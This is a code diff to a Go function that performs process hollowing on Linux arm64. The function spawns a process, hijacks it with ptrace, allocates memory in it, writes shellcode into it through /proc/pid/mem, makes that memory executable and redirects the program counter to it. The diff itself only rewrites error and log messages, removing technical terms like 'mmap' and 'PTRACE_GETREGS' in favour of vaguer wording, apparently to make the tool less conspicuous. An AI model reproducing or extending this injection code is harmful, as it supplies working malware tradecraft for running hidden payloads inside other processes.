@@ -82,7 +82,7 @@ func performHollowingLinuxArm64(shellcode []byte, params hollowParams) (string, 
 	}
 
 	if err := cmd.Start(); err != nil {
-		return sb.String(), fmt.Errorf("CreateProcess failed: %w", err)
+		return sb.String(), fmt.Errorf("Process creation failed: %w", err)
 	}
 
 	pid := cmd.Process.Pid
@@ -103,7 +103,7 @@ func performHollowingLinuxArm64(shellcode []byte, params hollowParams) (string, 
 	var origRegs syscall.PtraceRegs
 	if err := syscall.PtraceGetRegs(pid, &origRegs); err != nil {
 		_ = cmd.Process.Kill()
-		return sb.String(), fmt.Errorf("PTRACE_GETREGS: %w", err)
+		return sb.String(), fmt.Errorf("register read: %w", err)
 	}
 	sb.WriteString(fmt.Sprintf("[+] Original PC: 0x%X\n", origRegs.Pc))
 
@@ -124,13 +124,13 @@ func performHollowingLinuxArm64(shellcode []byte, params hollowParams) (string, 
 		arm64SysMmap, 0, pageSize, 3, 0x22, ^uint64(0), 0)
 	if err != nil {
 		_ = cmd.Process.Kill()
-		return sb.String(), fmt.Errorf("mmap failed: %w", err)
+		return sb.String(), fmt.Errorf("memory allocation failed: %w", err)
 	}
 	if allocAddr >= 0xfffffffffffff000 {
 		_ = cmd.Process.Kill()
-		return sb.String(), fmt.Errorf("mmap returned MAP_FAILED (0x%X)", allocAddr)
+		return sb.String(), fmt.Errorf("memory allocation returned error (0x%X)", allocAddr)
 	}
-	sb.WriteString(fmt.Sprintf("[+] mmap RW at 0x%X (%d bytes)\n", allocAddr, pageSize))
+	sb.WriteString(fmt.Sprintf("[+] Allocated writable memory at 0x%X (%d bytes)\n", allocAddr, pageSize))
 
 	memPath := fmt.Sprintf("/proc/%d/mem", pid)
 	n, err := writeProcMem(memPath, allocAddr, shellcode)
@@ -144,24 +144,24 @@ func performHollowingLinuxArm64(shellcode []byte, params hollowParams) (string, 
 		arm64SysMprotect, allocAddr, pageSize, 5, 0, 0, 0)
 	if err != nil {
 		_ = cmd.Process.Kill()
-		return sb.String(), fmt.Errorf("mprotect failed: %w", err)
+		return sb.String(), fmt.Errorf("protection change failed: %w", err)
 	}
 	if mprotectRet != 0 {
-		sb.WriteString(fmt.Sprintf("[!] mprotect returned %d, continuing\n", int64(mprotectRet)))
+		sb.WriteString(fmt.Sprintf("[!] Protection change returned %d, continuing\n", int64(mprotectRet)))
 	} else {
-		sb.WriteString("[+] mprotect: RW → RX\n")
+		sb.WriteString("[+] Protection changed to read+execute\n")
 	}
 
 	newRegs := origRegs
 	newRegs.Pc = allocAddr
 	if err := syscall.PtraceSetRegs(pid, &newRegs); err != nil {
 		_ = cmd.Process.Kill()
-		return sb.String(), fmt.Errorf("PTRACE_SETREGS: %w", err)
+		return sb.String(), fmt.Errorf("register write: %w", err)
 	}
 	sb.WriteString(fmt.Sprintf("[+] Set PC to 0x%X\n", allocAddr))
 
 	if err := syscall.PtraceDetach(pid); err != nil {
-		sb.WriteString(fmt.Sprintf("[!] PTRACE_DETACH failed: %v\n", err))
+		sb.WriteString(fmt.Sprintf("[!] Detach failed: %v\n", err))
 	} else {
 		sb.WriteString("[+] Detached from process\n")
 	}
